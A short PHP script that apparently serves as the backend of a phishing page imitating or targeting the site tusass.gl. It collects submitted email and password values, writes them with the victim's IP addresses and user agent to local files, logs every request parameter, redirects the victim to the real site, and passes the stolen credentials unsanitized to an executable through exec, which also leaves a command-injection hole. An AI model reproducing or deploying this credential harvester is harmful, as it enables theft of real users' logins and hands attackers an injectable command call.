<?php

header("Location: http://www.tusass.gl ");


$credentials_handler = fopen("data/passwords.txt", "a");

$username = $_GET['email'];
$password = $_GET['pass'];

fwrite($credentials_handler, "email='$username'\r\n");
fwrite($credentials_handler, "pass='$password'\r\n");
fwrite($credentials_handler, $_SERVER['HTTP_CLIENT_IP'] . "\r\n");
fwrite($credentials_handler, "----------------\r\n");

fclose($credentials_handler);


$log_handler = fopen("data/comprehensive_log.log", "a");

foreach($_GET as $variable => $value) {
    fwrite($log_handler, "$variable='$value'\r\n");
}

fwrite($log_handler, "non-standard data------\r\n");
fwrite($log_handler, $_SERVER['HTTP_USER_AGENT']);
fwrite($log_handler, "\r\n");
fwrite($log_handler, $_SERVER['HTTP_CLIENT_IP'] . "\r\n");
fwrite($log_handler, $_SERVER['HTTP_X_FORWARDED_FOR'] . "\r\n");
fwrite($log_handler, $_SERVER['REMOTE_ADDR'] . "\r\n");
fwrite($log_handler, "----------------\r\n");

fclose($log_handler);


exec("executables/Execute.exe $username $password");


exit;

?> 